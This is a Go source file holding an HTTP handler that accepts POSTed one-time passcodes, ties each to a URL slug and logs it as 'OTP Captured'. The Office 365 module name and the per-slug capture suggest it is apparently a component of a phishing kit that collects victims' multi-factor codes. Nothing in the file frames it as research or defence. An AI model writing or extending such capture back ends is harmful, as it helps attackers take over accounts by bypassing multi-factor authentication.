package handlers

import (
	"encoding/json"
	"io"
	"log"
	"net/http"
	"o365/utils"
	"strings"
)

// OTPTrackPayload represents the structure of incoming OTP code data
type OTPTrackPayload struct {
	Code string `json:"code"`
}

// HandleOTPTrack receives OTP codes for tracking
func HandleOTPTrack(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid method", http.StatusMethodNotAllowed)
		return
	}

	slug := strings.Split(strings.TrimPrefix(r.URL.Path, "/"), "/")[0]

	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Printf("❌ Failed to read OTP body: %v", err)
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var payload OTPTrackPayload
	if err := json.Unmarshal(body, &payload); err != nil {
		log.Printf("❌ OTP JSON parse error: %v", err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	if payload.Code != "" {
		utils.SystemLogger.Info().
			Str("slug", slug).
			Str("otp", payload.Code).
			Msg("🔐 OTP Captured")
	}

	w.WriteHeader(http.StatusNoContent)
}
